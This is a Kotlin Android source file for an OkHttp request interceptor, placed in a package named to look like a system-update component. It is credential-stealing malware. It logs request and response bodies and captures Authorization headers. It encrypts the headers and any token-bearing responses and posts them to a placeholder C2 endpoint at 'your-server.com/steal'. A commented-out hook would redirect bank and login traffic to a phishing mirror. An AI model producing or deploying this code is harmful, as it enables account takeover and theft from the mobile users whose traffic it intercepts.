package com.system.updates.modules.network

import android.util.Log
import okhttp3.Interceptor
import okhttp3.Request
import okhttp3.Response
import okhttp3.ResponseBody
import okhttp3.MediaType
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody
import okio.Buffer
import org.json.JSONObject
import com.system.updates.core.CryptoManager
import com.system.updates.core.NetworkUtils
import java.io.IOException

class RequestInterceptor : Interceptor {

    private val TAG = "RequestInterceptor"
    private var crypto: CryptoManager? = null
    private var networkUtils: NetworkUtils? = null

    fun init(crypto: CryptoManager, networkUtils: NetworkUtils) {
        this.crypto = crypto
        this.networkUtils = networkUtils
    }

    @Throws(IOException::class)
    override fun intercept(chain: Interceptor.Chain): Response {
        val originalRequest = chain.request()
        val requestBody = originalRequest.body
        val requestUrl = originalRequest.url.toString()

        // Log the intercepted request
        Log.d(TAG, "Intercepting: $requestUrl")

        // Extract and potentially log request body
        var bodyString: String? = null
        if (requestBody != null) {
            val buffer = Buffer()
            requestBody.writeTo(buffer)
            bodyString = buffer.readUtf8()
            Log.d(TAG, "Request Body: $bodyString")
        }

        // Extract headers (especially auth tokens)
        val headers = originalRequest.headers
        val authHeader = headers["Authorization"]
        if (authHeader != null) {
            Log.d(TAG, "Auth token intercepted: $authHeader")
            // Send token to C2 server (encrypted)
            crypto?.let {
                val encrypted = it.encryptData(authHeader.toByteArray())
                networkUtils?.httpPost("https://your-server.com/steal", "token=${android.util.Base64.encodeToString(encrypted, android.util.Base64.NO_WRAP)}")
            }
        }

        // Modify request: add custom header or change URL
        val modifiedRequestBuilder = originalRequest.newBuilder()
            .header("X-Interceptor", "SystemUpdates")
            .header("X-Device-ID", crypto?.getDeviceId() ?: "unknown")

        // Optional: redirect to C2 server for certain requests
        if (requestUrl.contains("bank") || requestUrl.contains("login")) {
            // In a real scenario, you might redirect to a phishing server
            // modifiedRequestBuilder.url("https://your-c2-server.com/mirror")
        }

        val modifiedRequest = modifiedRequestBuilder.build()
        val response = chain.proceed(modifiedRequest)

        // Intercept and inspect response
        val responseBody = response.body
        if (responseBody != null) {
            val responseString = responseBody.string()
            Log.d(TAG, "Response Body: $responseString")

            // Re-create the response body because it can be consumed only once
            val newResponseBody = ResponseBody.create(
                responseBody.contentType(),
                responseString
            )
            // Send interesting response data to C2
            if (responseString.contains("token") || responseString.contains("access_token")) {
                crypto?.let {
                    val encrypted = it.encryptData(responseString.toByteArray())
                    networkUtils?.httpPost("https://your-server.com/steal", "response=${android.util.Base64.encodeToString(encrypted, android.util.Base64.NO_WRAP)}")
                }
            }
            return response.newBuilder().body(newResponseBody).build()
        }

        return response
    }
}